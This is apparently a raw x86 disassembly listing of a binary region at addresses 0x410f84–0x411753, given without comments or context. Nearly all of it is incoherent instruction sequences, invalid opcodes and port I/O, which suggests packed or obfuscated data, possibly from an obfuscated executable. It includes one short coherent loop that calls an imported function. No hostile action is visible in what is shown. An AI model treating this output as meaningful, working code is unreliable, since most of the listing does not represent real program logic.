  410f84:	mov    bh,0xb5
  410f86:	cld    
  410f87:	mov    dl,BYTE PTR [ecx]
  410f89:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410f8a:	fld    TBYTE PTR [ebp+0xf]
  410f8d:	arpl   bx,di
  410f8f:	retf   0x1678
  410f92:	push   ss
  410f93:	or     ebp,DWORD PTR [edx]
  410f95:	mov    eax,0x2ca1641e
  410f9a:	mov    dl,0x41
  410f9c:	add    BYTE PTR [edx+0x32729c],bh
  410fa2:	sub    eax,edx
  410fa4:	adc    DWORD PTR ds:0x42fd6e,ebx
  410faa:	mov    ecx,0x7510855
  410faf:	push   esi
  410fb0:	mov    esi,DWORD PTR [ebp+0xc]
  410fb3:	xor    eax,ecx
  410fb5:	mov    DWORD PTR ds:0x42e11c,0x4b31
  410fbf:	jmp    0x4113c4
  410fc4:	xchg   edx,eax
  410fc5:	shl    DWORD PTR [edi+eiz*8+0x71516771],cl
  410fcc:	push   ebp
  410fcd:	paddsw mm6,QWORD PTR [eax-0x30b0db3a]
  410fd4:	es dec esi
  410fd6:	jo     0x411048
  410fd8:	pop    eax
  410fd9:	jge    0x41104b
  410fdb:	jo     0x411022
  410fdd:	cmp    al,BYTE PTR [ebp+ebx*8-0x338d63fa]
  410fe4:	jo     0x410f9c
  410fe6:	je     0x41101f
  410fe8:	imul   ebp,eax,0xffffffcd
  410feb:	sub    esi,DWORD PTR [ebp-0x571305e9]
  410ff1:	test   BYTE PTR [ebp-0x2de25c18],cl
  410ff7:	lods   eax,DWORD PTR ds:[esi]
  410ff8:	adc    edi,edx
  410ffa:	cmp    al,0x16
  410ffc:	div    esi
  410ffe:	push   eax
  410fff:	aas    
  411000:	test   eax,0xac038169
  411005:	inc    ebp
  411006:	je     0x410fbe
  411008:	xlat   BYTE PTR ds:[bx]
  41100a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41100b:	mov    al,0xa1
  41100d:	sbb    eax,0x9fdb181f
  411012:	cwde   
  411013:	sbb    ah,dl
  411015:	iret   
  411016:	push   ecx
  411017:	mov    eax,DWORD PTR [ecx]
  411019:	aaa    
  41101a:	cmp    al,0xb8
  41101c:	push   ebx
  41101d:	in     al,0x99
  41101f:	test   al,0xe4
  411021:	or     ah,BYTE PTR [ebp+0x6f266e4d]
  411027:	pop    ss
  411028:	and    eax,eax
  41102a:	test   eax,0xde10ee5b
  41102f:	adc    DWORD PTR [ebp+eax*2-0x76],esi
  411033:	mov    ecx,DWORD PTR [edi-0x66]
  411036:	call   DWORD PTR [esi+0x4]
  411039:	mov    bl,BYTE PTR [edi+0x6c44732a]
  41103f:	repnz in al,dx
  411041:	clc    
  411042:	cwde   
  411043:	mov    WORD PTR [edi+ebx*8-0x444567dc],?
  41104a:	(bad)  
  41104c:	les    edx,FWORD PTR [eax+0x7b]
  41104f:	mov    cl,0x69
  411051:	call   0x6d596267
  411056:	fidivr DWORD PTR [esi+ecx*1]
  411059:	sub    BYTE PTR [esi],0x4f
  41105c:	jnp    0x411085
  41105e:	out    dx,al
  41105f:	xchg   ebp,eax
  411060:	sub    ecx,DWORD PTR [ebp+0x7c17e1f6]
  411066:	mov    DWORD PTR [eax+0x2d119a0b],ecx
  41106c:	mul    ebx
  41106e:	fild   WORD PTR [eax-0x45]
  411071:	push   es
  411072:	mov    eax,ebx
  411074:	out    dx,eax
  411075:	shl    DWORD PTR [edx-0x6a],cl
  411078:	mov    dh,0x56
  41107a:	adc    dl,BYTE PTR [esi-0x48]
  41107d:	xchg   esp,eax
  41107e:	mov    al,0x41
  411080:	adc    DWORD PTR [edx],esi
  411082:	xchg   edi,eax
  411083:	push   DWORD PTR [edx]
  411085:	inc    esi
  411086:	sahf   
  411087:	aas    
  411088:	add    ecx,DWORD PTR [ecx+0x11]
  41108b:	add    edi,ebx
  41108d:	adc    esp,DWORD PTR [edx+0x732b6ef4]
  411093:	cmp    cl,BYTE PTR [ebp-0x53543e73]
  411099:	inc    edi
  41109a:	or     BYTE PTR [edx-0x658c4c12],0x34
  4110a1:	sub    ecx,esi
  4110a3:	mov    esp,0x83ec63
  4110a8:	xchg   BYTE PTR [ecx-0x15],ch
  4110ab:	dec    ebp
  4110ac:	cmp    eax,DWORD PTR [ebx+0x71]
  4110af:	mov    esi,DWORD PTR [edx+0x2f9d38f2]
  4110b5:	adc    BYTE PTR [esi-0x54004049],0x28
  4110bc:	fs cs and esp,esp
  4110c0:	ret    0x8083
  4110c3:	icebp  
  4110c4:	jle    0x6da060f
  4110ca:	out    0xda,al
  4110cc:	inc    esi
  4110cd:	add    edx,DWORD PTR [ecx+0x1e6e44d9]
  4110d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4110d4:	test   eax,0x4bd95f61
  4110d9:	xchg   DWORD PTR [eax-0x230e5d7],esp
  4110df:	pop    esp
  4110e0:	aam    0x13
  4110e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4110e3:	inc    edx
  4110e4:	mov    esi,0x3a7f8b30
  4110e9:	sub    eax,0x2725ba36
  4110ee:	fnstsw WORD PTR [eax]
  4110f0:	out    dx,al
  4110f1:	xchg   ebx,eax
  4110f2:	add    al,0xa2
  4110f4:	fstp   QWORD PTR [edx+0x52]
  4110f7:	mov    WORD PTR [edx],es
  4110f9:	(bad)  
  4110fa:	loop   0x411172
  4110fc:	jo     0x41112e
  4110fe:	xchg   DWORD PTR [esi+0x70d74cb7],ecx
  411104:	das    
  411105:	stc    
  411106:	sti    
  411107:	mov    ds:0xec2f1a21,al
  41110c:	dec    ebx
  41110d:	cwde   
  41110e:	adc    BYTE PTR [ebx+eiz*8-0x19],cl
  411112:	mov    edx,0x1829528d
  411117:	inc    esi
  411118:	sar    edx,cl
  41111a:	lods   eax,DWORD PTR ds:[esi]
  41111b:	ins    BYTE PTR es:[edi],dx
  41111c:	scas   al,BYTE PTR es:[edi]
  41111d:	scas   eax,DWORD PTR es:[edi]
  41111e:	add    BYTE PTR [ebx-0x10],ah
  411121:	fucomip st,st(3)
  411123:	ret    0xa1c8
  411126:	and    ch,BYTE PTR [ecx+edi*8+0x13]
  41112a:	mov    ebp,0xed57ff65
  41112f:	mov    ebp,0xe80e1e98
  411134:	fcom   QWORD PTR [esp+esi*1-0x6299b14a]
  41113b:	mov    ch,0x2b
  41113d:	in     eax,0xae
  41113f:	out    dx,eax
  411140:	jae    0x4110d1
  411142:	(bad)  
  411143:	out    0xe7,al
  411145:	mov    ch,0xc1
  411147:	or     edx,DWORD PTR [edx+ecx*2]
  41114a:	(bad)  
  41114c:	sub    ah,BYTE PTR [ebx+0x764b0b56]
  411152:	dec    edx
  411153:	push   ecx
  411154:	mov    esp,0xd2439135
  411159:	shl    bl,1
  41115b:	pop    esp
  41115c:	cmp    bh,BYTE PTR [edi-0x49f7334a]
  411162:	dec    edx
  411163:	je     0x4111be
  411165:	xchg   edx,eax
  411166:	inc    ebx
  411167:	cmp    ebp,DWORD PTR [eax]
  411169:	pop    ebx
  41116a:	xchg   ecx,eax
  41116b:	out    dx,al
  41116c:	loope  0x41111c
  41116e:	sub    edi,DWORD PTR [edx]
  411170:	cwde   
  411171:	hlt    
  411172:	in     al,0xb4
  411174:	xchg   ecx,eax
  411175:	iret   
  411176:	adc    ah,BYTE PTR [ecx]
  411178:	int3   
  411179:	jmp    0xdc46452d
  41117e:	xchg   ebx,eax
  41117f:	pop    ss
  411180:	xchg   ebx,eax
  411181:	sub    dh,al
  411183:	shl    dl,1
  411185:	or     al,BYTE PTR [eax+0x3c]
  411188:	jle    0x4111be
  41118a:	and    eax,0xd0d1234d
  41118f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411190:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411191:	cmp    BYTE PTR [edx-0x3b9947a8],0x5c
  411198:	dec    ebp
  411199:	sar    bh,1
  41119b:	fisub  WORD PTR [edx-0x68f18fab]
  4111a1:	push   edx
  4111a2:	cmp    al,0x7e
  4111a4:	jmp    0xb620:0x276e61c1
  4111ab:	push   ebx
  4111ac:	sti    
  4111ad:	push   ebx
  4111ae:	or     eax,0x9030fbe9
  4111b3:	add    al,0x4b
  4111b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4111b6:	push   ds
  4111b7:	adc    bh,al
  4111b9:	and    al,0x0
  4111bb:	jns    0x4111d7
  4111bd:	fxch   st(5)
  4111bf:	sub    ebp,edx
  4111c1:	scas   al,BYTE PTR es:[edi]
  4111c2:	mov    bh,0x2
  4111c4:	and    eax,0x69993306
  4111c9:	push   ds
  4111ca:	jns    0x4111ee
  4111cc:	xchg   ebp,eax
  4111cd:	(bad)  
  4111ce:	xor    BYTE PTR [edx+0x62],bh
  4111d1:	imul   esi,DWORD PTR [eax+0x13],0xffffffdc
  4111d5:	jmp    0x41122c
  4111d7:	and    al,0x2f
  4111d9:	mov    dl,0x97
  4111db:	aad    0x3
  4111dd:	repnz or ch,BYTE PTR ds:0x5f2d3859
  4111e4:	mov    esp,0x4bcf514d
  4111e9:	xchg   esp,eax
  4111ea:	adc    DWORD PTR [esi+0x66c447d7],0xffffff99
  4111f1:	scas   eax,DWORD PTR es:[edi]
  4111f2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4111f3:	lea    ecx,[edi+0xe82e9c6]
  4111f9:	outs   dx,DWORD PTR ds:[esi]
  4111fa:	xchg   ecx,eax
  4111fb:	mov    cl,0x7d
  4111fd:	jae    0x4111ef
  4111ff:	jg     0x4111a3
  411201:	jle    0x4111ba
  411203:	sti    
  411204:	and    DWORD PTR [ebx],edx
  411206:	xor    DWORD PTR [ebx],edi
  411208:	xor    DWORD PTR [ebx+0x53],edx
  41120b:	das    
  41120c:	mov    ch,0x50
  41120e:	test   DWORD PTR [esi+0x36],ecx
  411211:	jl     0x4111b0
  411213:	sub    ebx,DWORD PTR [esp+ecx*2-0x26]
  411217:	scas   al,BYTE PTR es:[edi]
  411218:	jp     0x41119e
  41121a:	gs enter 0x9cb,0x36
  41121f:	or     esp,DWORD PTR [ebp+edx*1+0x45c916fe]
  411226:	mov    ds,edx
  411228:	push   esi
  411229:	xchg   edx,eax
  41122a:	imul   esp,DWORD PTR [ebx+ebp*8-0x1],0xffffff8a
  41122f:	or     ah,BYTE PTR [edi-0x52]
  411232:	sar    DWORD PTR [edx-0x273c1002],0x4b
  411239:	jbe    0x4111ca
  41123b:	dec    ebp
  41123c:	ins    DWORD PTR es:[edi],dx
  41123d:	sar    BYTE PTR [edi],cl
  41123f:	int3   
  411240:	dec    ecx
  411241:	mov    esp,0xe0cd6ae2
  411246:	add    ah,bh
  411248:	pop    ebp
  411249:	push   edx
  41124a:	fidivr DWORD PTR [esi-0x650236e1]
  411250:	imul   BYTE PTR [edi+0x23003293]
  411256:	or     eax,0x8f766bd
  41125b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41125c:	in     eax,dx
  41125d:	nop    ebx
  411260:	sub    DWORD PTR [esp+ebx*4-0x5c6ff544],edx
  411267:	out    0xce,eax
  411269:	adc    ecx,ebx
  41126b:	sbb    al,0x6f
  41126d:	ret    
  41126e:	inc    ebx
  41126f:	jmp    0xd7e8:0x6c3f2d8a
  411276:	mov    cl,0x41
  411278:	outs   dx,BYTE PTR ds:[esi]
  411279:	jp     0x411260
  41127b:	(bad)  
  41127d:	xchg   DWORD PTR [esi],ebp
  41127f:	pop    ds
  411280:	pop    ss
  411281:	xchg   DWORD PTR [edx+esi*2],ecx
  411284:	setnp  BYTE PTR [ecx]
  411287:	nop
  411288:	fsubr  st(0),st
  41128a:	xchg   ecx,eax
  41128b:	imul   ebp,DWORD PTR ds:0x8334d4f9,0x260a1286
  411295:	or     esi,ecx
  411297:	int3   
  411298:	dec    ebp
  411299:	sbb    DWORD PTR [ebx-0x673a0558],edi
  41129f:	repnz inc edi
  4112a1:	in     eax,0xac
  4112a3:	sub    DWORD PTR [ecx],ecx
  4112a5:	retf   
  4112a6:	je     0x4112ef
  4112a8:	cmp    esi,DWORD PTR [eax+edi*8+0x2c27cade]
  4112af:	xchg   edi,eax
  4112b0:	outs   dx,BYTE PTR ds:[esi]
  4112b1:	retf   
  4112b2:	repnz xor BYTE PTR [ebx-0x2c],dl
  4112b6:	cli    
  4112b7:	dec    edi
  4112b8:	fwait
  4112b9:	dec    edi
  4112ba:	xchg   dl,bl
  4112bc:	out    0xf6,al
  4112be:	jno    0x41124a
  4112c0:	addr16 xor al,0x39
  4112c3:	push   edx
  4112c4:	fdivr  st,st(3)
  4112c6:	rcr    DWORD PTR [ecx-0x1cbfa9ac],1
  4112cc:	xchg   esi,eax
  4112cd:	in     eax,dx
  4112ce:	nop
  4112cf:	sbb    dl,BYTE PTR [eax]
  4112d1:	outs   dx,BYTE PTR ds:[esi]
  4112d2:	sbb    DWORD PTR [edi+0x61],ecx
  4112d5:	jl     0x4112fe
  4112d7:	mov    eax,0x1b11f8c3
  4112dc:	inc    esp
  4112dd:	pop    es
  4112de:	or     al,0x7e
  4112e0:	ret    
  4112e1:	xchg   ebx,eax
  4112e2:	into   
  4112e3:	pusha  
  4112e4:	popa   
  4112e5:	dec    ebp
  4112e6:	mov    DWORD PTR [ecx-0x4ae1ef06],0x71b91cbe
  4112f0:	ins    DWORD PTR es:[edi],dx
  4112f1:	cmp    ecx,DWORD PTR [edx+0x28]
  4112f4:	stos   BYTE PTR es:[edi],al
  4112f5:	les    ecx,FWORD PTR [edi+eiz*1]
  4112f8:	ss clc 
  4112fa:	jns    0x4112c4
  4112fc:	xor    bl,BYTE PTR [ecx+0x61]
  4112ff:	ret    0x1469
  411302:	pushf  
  411303:	or     eax,0x987e64bb
  411308:	mov    cl,0x3b
  41130a:	xchg   edx,eax
  41130b:	sahf   
  41130c:	xchg   ecx,eax
  41130d:	test   eax,0x6742bda6
  411312:	call   0x8bd93550
  411317:	lea    edi,[ebx-0x7cdef0]
  41131d:	adc    BYTE PTR [ebp-0x41fbbb76],al
  411323:	mov    edx,0xab65276e
  411328:	cwde   
  411329:	xchg   ecx,eax
  41132a:	jbe    0x41137f
  41132c:	mov    ds:0xe24146f9,eax
  411331:	fs dec eax
  411333:	inc    eax
  411334:	adc    al,BYTE PTR [ecx]
  411336:	mov    ecx,0xc96a0e3
  41133b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41133c:	push   ebp
  41133d:	cmp    eax,0xa219c4f5
  411342:	pop    eax
  411343:	pop    ss
  411344:	sti    
  411345:	retf   0x184
  411348:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411349:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41134a:	and    DWORD PTR [esi-0x3a0d63c5],edx
  411350:	mov    cl,0x40
  411352:	xchg   ecx,eax
  411353:	cld    
  411354:	jle    0x411321
  411356:	ss (bad) 
  411359:	or     ebx,eax
  41135b:	nop
  41135c:	jge    0x4113af
  41135e:	in     al,0xb8
  411360:	adc    BYTE PTR [ebx-0x15],0xb4
  411364:	sub    eax,0x2f3a423c
  411369:	sti    
  41136a:	mov    al,ds:0x9dd07ecc
  41136f:	xor    BYTE PTR [edx-0x1453d7a0],bl
  411375:	cld    
  411376:	ret    
  411377:	push   cs
  411378:	fld    DWORD PTR [ecx+ebx*2+0x3]
  41137c:	pop    edi
  41137d:	outs   dx,BYTE PTR ds:[esi]
  41137e:	sar    dh,0xf2
  411381:	cdq    
  411382:	enter  0xffed,0x47
  411386:	int    0xf3
  411388:	mov    ebp,0x948725f7
  41138d:	fstp   st(2)
  41138f:	inc    esp
  411390:	sub    BYTE PTR [eax],0xd1
  411393:	loope  0x411324
  411395:	loope  0x411380
  411397:	sub    bh,dl
  411399:	jmp    FWORD PTR [edx+0x34]
  41139c:	test   al,0x72
  41139e:	mov    edi,0x2be835fe
  4113a3:	xlat   BYTE PTR ds:[ebx]
  4113a4:	nop
  4113a5:	sub    ebx,DWORD PTR [eax]
  4113a7:	je     0x4113b6
  4113a9:	jne    0x411381
  4113ab:	xor    BYTE PTR [esi],ch
  4113ad:	dec    edi
  4113ae:	mov    edx,0xe6265a78
  4113b3:	or     cl,al
  4113b5:	fisttp WORD PTR [ebp+0x2d]
  4113b8:	xor    al,0xd
  4113ba:	scas   al,BYTE PTR es:[edi]
  4113bb:	pop    ebp
  4113bc:	es inc ebp
  4113be:	mov    ebx,0xde6b3ef3
  4113c3:	sub    BYTE PTR [ebx],bh
  4113c5:	mov    bh,0x5
  4113c8:	icebp  
  4113c9:	cld    
  4113ca:	inc    edx
  4113cb:	add    ah,ah
  4113cd:	js     0x4113cf
  4113cf:	add    BYTE PTR [edi],cl
  4113d1:	test   ah,al
  4113d3:	or     BYTE PTR [eax],al
  4113d5:	add    BYTE PTR [ecx+0x41b224],ah
  4113db:	and    DWORD PTR ds:0x42fd7a,0x0
  4113e5:	mov    esi,DWORD PTR ds:0x42fd7a
  4113eb:	inc    esi
  4113ec:	mov    DWORD PTR ds:0x42fd7a,esi
  4113f2:	cmp    DWORD PTR ds:0x42fd7a,0x8
  4113f9:	jne    0x41140f
  4113ff:	push   0x42e1e7
  411404:	push   0x42e26d
  411409:	call   DWORD PTR ds:0x42e567
  41140f:	cmp    DWORD PTR ds:0x42fd7a,0x7
  411416:	jne    0x411429
  41141c:	mov    esi,DWORD PTR ds:0x42fd7a
  411422:	inc    esi
  411423:	mov    DWORD PTR ds:0x42fd7a,esi
  411429:	cmp    DWORD PTR ds:0x42fd7a,0x13
  411430:	jb     0x4113e5
  411436:	jmp    0x41183b
  41143b:	and    cl,al
  41143d:	leave  
  41143e:	adc    ch,cl
  411440:	adc    ecx,esp
  411442:	call   0xcb53bead
  411447:	out    dx,eax
  411448:	mov    ebx,0x4a0e4e4f
  41144d:	jo     0x4114bf
  41144f:	pop    eax
  411450:	jge    0x4114c2
  411452:	jo     0x4113f3
  411454:	inc    ebp
  411455:	pusha  
  411456:	leave  
  411457:	add    DWORD PTR [esi+eiz*1-0x14],edi
  41145b:	cs mov ch,0x22
  41145e:	pusha  
  41145f:	xor    ch,bh
  411461:	xchg   esp,eax
  411462:	inc    ecx
  411463:	cmp    edx,DWORD PTR [ebx]
  411465:	push   0xfffffff6
  411467:	jns    0x411440
  411469:	xchg   DWORD PTR [edx],edi
  41146b:	rol    BYTE PTR [edi],cl
  41146d:	fwait
  41146e:	pop    edx
  41146f:	(bad)  [edi+0x74]
  411472:	xor    al,0xc7
  411474:	lahf   
  411475:	xchg   esp,eax
  411476:	inc    eax
  411477:	xor    al,ch
  411479:	sbb    DWORD PTR [ebx+0x7b69cf60],ebp
  41147f:	xor    BYTE PTR [esi+0x28bdfe17],ah
  411485:	test   BYTE PTR [edi-0x49],0x5
  411489:	icebp  
  41148a:	icebp  
  41148b:	out    dx,eax
  41148c:	retf   
  41148d:	xor    eax,0xafcbf5be
  411492:	cmp    eax,0x1f1fc82c
  411497:	push   esp
  411498:	lds    edx,FWORD PTR ds:0xf9a6f97b
  41149e:	xchg   ebx,ebx
  4114a0:	cmp    eax,0x7fcecc97
  4114a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4114a6:	mov    ch,0x21
  4114a8:	inc    edx
  4114a9:	(bad)  
  4114aa:	cmc    
  4114ab:	lds    cx,DWORD PTR [ecx+ebx*2+0x13]
  4114b0:	ins    BYTE PTR es:[edi],dx
  4114b1:	mov    DWORD PTR [edx-0x56],ebx
  4114b4:	lods   al,BYTE PTR ds:[esi]
  4114b5:	popa   
  4114b6:	jns    0x41146c
  4114b8:	push   esp
  4114ba:	dec    esp
  4114bb:	push   esi
  4114bc:	pop    esp
  4114bd:	xchg   esp,eax
  4114be:	xor    DWORD PTR [esi],ebp
  4114c0:	lock leave 
  4114c2:	cwde   
  4114c3:	bound  ebp,QWORD PTR [edx+0x39]
  4114c6:	dec    ecx
  4114c7:	push   0xfdb0e9b6
  4114cc:	push   esi
  4114cd:	add    BYTE PTR [ebx],cl
  4114cf:	jns    0x411472
  4114d1:	or     al,al
  4114d3:	adc    cl,ch
  4114d5:	sahf   
  4114d6:	xor    ebp,DWORD PTR [ecx]
  4114d8:	les    ebp,FWORD PTR [esi-0x40]
  4114db:	pop    ebx
  4114dc:	xchg   ecx,eax
  4114dd:	add    bl,BYTE PTR [esi+0x14]
  4114e0:	inc    ecx
  4114e1:	push   eax
  4114e2:	div    DWORD PTR [edx-0x7b]
  4114e5:	push   0x74
  4114e7:	into   
  4114e8:	loop   0x4114f5
  4114ea:	(bad)  
  4114ec:	aam    0x6
  4114ee:	adc    ah,BYTE PTR [ecx-0x48ef168d]
  4114f4:	out    dx,eax
  4114f5:	test   DWORD PTR [esi],ecx
  4114f7:	push   ds
  4114f8:	imul   BYTE PTR [ebp+0x7]
  4114fb:	outs   dx,BYTE PTR ds:[esi]
  4114fc:	or     al,0xec
  4114fe:	push   0x8ae9a875
  411503:	out    0x74,al
  411505:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411506:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411507:	xor    cl,BYTE PTR [edi-0x4a]
  41150a:	(bad)  
  41150b:	outs   dx,BYTE PTR ds:[esi]
  41150c:	hlt    
  41150d:	repnz or al,0xf3
  411510:	xchg   esi,eax
  411511:	mov    BYTE PTR [edi+0x4d93adc9],al
  411517:	fisub  DWORD PTR [esi]
  411519:	add    BYTE PTR [ebp-0x2d],0xb2
  41151d:	imul   esp,DWORD PTR [eax-0x64],0xffffff9e
  411521:	adc    ah,BYTE PTR [ecx+0x6c71071b]
  411527:	push   edi
  411528:	sahf   
  411529:	or     al,0xc7
  41152b:	jnp    0x4114be
  41152d:	jae    0x41153f
  41152f:	jb     0x4114f1
  411531:	jge    0x41159b
  411533:	aam    0x16
  411535:	sti    
  411536:	mov    ah,0x56
  411538:	sub    cl,cl
  41153a:	in     al,0xeb
  41153c:	jg     0x4114d6
  41153e:	pop    eax
  41153f:	mov    WORD PTR [ecx],cs
  411541:	fcmovu st,st(7)
  411543:	jecxz  0x41155e
  411545:	jb     0x41159d
  411547:	sbb    al,0xe4
  411549:	jmp    0xf1325bde
  41154e:	xchg   esi,eax
  41154f:	out    0x2c,eax
  411551:	mov    esp,DWORD PTR [ebp+esi*2-0x4c6e0042]
  411558:	ins    DWORD PTR es:[edi],dx
  411559:	call   0x9dc:0xf8df6058
  411560:	and    bl,BYTE PTR [ebp+edx*1+0x2c1aae85]
  411567:	mov    ds:0x3b68d527,eax
  41156c:	sub    edi,DWORD PTR [eax+0x3]
  41156f:	cli    
  411570:	not    DWORD PTR [ecx+0x2e]
  411573:	cwde   
  411574:	xchg   edi,eax
  411575:	mov    al,0x4f
  411577:	jo     0x4115be
  411579:	mov    ebx,0x8c3cbaa1
  41157e:	ret    0x6c91
  411581:	adc    eax,0xdffe2d18
  411586:	inc    edi
  411587:	jg     0x4115a8
  411589:	inc    ebp
  41158a:	rol    DWORD PTR [edi-0x3969f11d],1
  411590:	jo     0x411579
  411592:	or     al,0xcf
  411594:	nop
  411595:	dec    edx
  411596:	dec    edx
  411597:	jp     0x411599
  411599:	xor    ch,ch
  41159b:	mov    ah,0x84
  41159d:	adc    BYTE PTR [edi+0x4c],ch
  4115a0:	xchg   esp,eax
  4115a1:	jne    0x411611
  4115a3:	nop
  4115a4:	xchg   ebp,eax
  4115a5:	ficomp DWORD PTR [esi-0x750322b8]
  4115ab:	int3   
  4115ac:	sub    bh,dl
  4115ae:	lods   eax,DWORD PTR ds:[esi]
  4115af:	fwait
  4115b0:	in     eax,0xfb
  4115b2:	es inc eax
  4115b4:	jbe    0x4115df
  4115b6:	repz call 0xab13:0x3bb26157
  4115be:	sbb    ch,dl
  4115c0:	push   edi
  4115c1:	jb     0x4115aa
  4115c3:	ror    al,1
  4115c5:	les    ebx,FWORD PTR [eax+0x72b3b7d4]
  4115cb:	fild   WORD PTR [eax]
  4115cd:	and    eax,DWORD PTR [ebp-0x5a4ba461]
  4115d3:	jmp    0x74fae76
  4115d8:	imul   BYTE PTR [eax]
  4115da:	repz push edx
  4115dc:	jns    0x411640
  4115de:	pop    esp
  4115df:	mov    esi,DWORD PTR [edx]
  4115e1:	inc    ebx
  4115e2:	dec    esi
  4115e3:	mov    esi,0xcbb715d5
  4115e8:	scas   al,BYTE PTR es:[edi]
  4115e9:	std    
  4115ea:	outs   dx,BYTE PTR ds:[esi]
  4115eb:	xor    ch,BYTE PTR [esi]
  4115ed:	sbb    al,0x55
  4115ef:	inc    ebp
  4115f0:	pop    ebp
  4115f1:	ret    0x54a2
  4115f4:	sbb    al,0xde
  4115f6:	std    
  4115f7:	int    0x9a
  4115f9:	aaa    
  4115fa:	jge    0x411650
  4115fc:	dec    ecx
  4115fd:	and    eax,0xba12371e
  411602:	mov    ds:0x2f82a75,eax
  411607:	sub    edi,DWORD PTR [eax+0x672fb303]
  41160d:	sbb    eax,0xe109e91c
  411612:	mov    al,ds:0xaa745755
  411617:	or     esp,eax
  411619:	adc    DWORD PTR [edx-0xd93327c],edx
  41161f:	je     0x4115f3
  411621:	push   ebp
  411622:	cmp    al,0x20
  411624:	cli    
  411625:	inc    ecx
  411626:	bound  ecx,QWORD PTR [eax+0x67cd96b9]
  41162c:	iret   
  41162d:	(bad)  
  41162f:	cmp    ch,BYTE PTR [ebx]
  411631:	sbb    ch,bl
  411633:	fst    QWORD PTR [ecx]
  411635:	sbb    bh,BYTE PTR [ecx]
  411637:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411638:	cmp    al,0xfc
  41163a:	(bad)  
  41163b:	inc    edx
  41163c:	test   eax,0x41fe7d5b
  411641:	icebp  
  411642:	pop    ss
  411643:	push   edx
  411644:	fwait
  411645:	and    dh,ch
  411647:	xchg   esi,eax
  411648:	jecxz  0x4115eb
  41164a:	fnstsw WORD PTR ds:0x89a831d
  411650:	cli    
  411651:	pop    esp
  411652:	xor    edx,DWORD PTR [ebx]
  411654:	cmp    ecx,DWORD PTR [eax+0x3fc63bf2]
  41165a:	xlat   BYTE PTR ds:[ebx]
  41165b:	mov    esi,0x5f3f9dbe
  411660:	cmp    eax,0xac2c0550
  411665:	or     al,0x65
  411667:	mov    bl,0xa6
  411669:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41166a:	les    ebx,FWORD PTR [edx]
  41166c:	mov    esi,0x24410e13
  411671:	es repnz mov ah,0xf1
  411675:	loop   0x4116e5
  411677:	mov    edi,0x26f5c611
  41167c:	call   FWORD PTR [edx]
  41167e:	imul   ebp,DWORD PTR [eax+0x461d377b],0x2cdc6e2f
  411688:	pop    esi
  411689:	mov    esp,0x4589373d
  41168e:	xchg   ebx,eax
  41168f:	push   esi
  411690:	inc    ecx
  411692:	mov    ch,BYTE PTR [ebp+ebp*4+0x46]
  411696:	and    DWORD PTR [edx-0x3ad2a110],ebp
  41169c:	adc    al,0xbf
  41169e:	jg     0x411680
  4116a0:	inc    esi
  4116a1:	mov    BYTE PTR [esi],ah
  4116a3:	outs   dx,DWORD PTR ds:[esi]
  4116a4:	adc    DWORD PTR [edi],ecx
  4116a6:	js     0x411631
  4116a8:	mov    bh,0x68
  4116aa:	je     0x411689
  4116ac:	ror    esp,0x38
  4116af:	mov    al,BYTE PTR [edx-0x2e]
  4116b2:	or     dl,BYTE PTR [edx]
  4116b4:	aaa    
  4116b5:	les    ebx,FWORD PTR [esi-0x17]
  4116b8:	sub    al,0xf0
  4116ba:	out    dx,al
  4116bb:	add    ecx,DWORD PTR [ebp+eiz*4-0x16]
  4116bf:	jb     0x4116f9
  4116c1:	cwde   
  4116c2:	xchg   ecx,eax
  4116c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4116c4:	jbe    0x41166c
  4116c6:	stos   BYTE PTR es:[edi],al
  4116c7:	push   cs
  4116c8:	and    eax,0xf9f79741
  4116cd:	dec    ebx
  4116ce:	jo     0x4116fc
  4116d0:	inc    edx
  4116d1:	inc    eax
  4116d2:	push   ebp
  4116d3:	sub    eax,DWORD PTR [edx-0x2d9699d8]
  4116d9:	add    al,0x71
  4116db:	fsub   st(4),st
  4116dd:	mov    ds,WORD PTR [edi+0x6a777bfc]
  4116e3:	add    edx,DWORD PTR [edi-0x24]
  4116e6:	enter  0xf10,0x6b
  4116ea:	retf   0x2a10
  4116ed:	pop    edx
  4116ee:	mov    DWORD PTR [eax],edx
  4116f0:	adc    dl,BYTE PTR [ebp-0xe80e88f]
  4116f6:	or     eax,0x293e0a65
  4116fb:	sub    BYTE PTR [ebx-0x3c14c835],ah
  411701:	xor    ebp,DWORD PTR [edi]
  411703:	pop    es
  411704:	pop    es
  411705:	clc    
  411706:	add    eax,0x28d1b4f
  41170b:	outs   dx,BYTE PTR ds:[esi]
  41170c:	jmp    0x41172a
  41170e:	fstp   TBYTE PTR [edi+0x42d5ab1c]
  411714:	pop    edx
  411715:	push   esp
  411716:	in     eax,dx
  411717:	out    dx,eax
  411718:	mov    al,ah
  41171a:	sub    DWORD PTR [esi+0x2673fa10],esp
  411720:	mov    edi,0x4857eb0e
  411725:	adc    BYTE PTR [ecx],dl
  411727:	adc    al,0xdb
  411729:	enter  0x53dd,0xab
  41172d:	push   ebx
  41172e:	cmp    eax,0xc3ba2057
  411733:	loop   0x41171c
  411735:	push   eax
  411736:	aas    
  411737:	mov    al,0xda
  411739:	cs icebp 
  41173b:	xor    edx,DWORD PTR [ebp+edi*8-0x16]
  41173f:	lea    ebx,[edi+0x19c95c43]
  411745:	mov    ebp,0xae443a1b
  41174a:	add    eax,DWORD PTR [edi]
  41174c:	pop    DWORD PTR [ecx+0x7f]
  41174f:	lock stos BYTE PTR es:[edi],al
  411751:	fcmove st,st(4)
  411753:	sbb    esp,esp
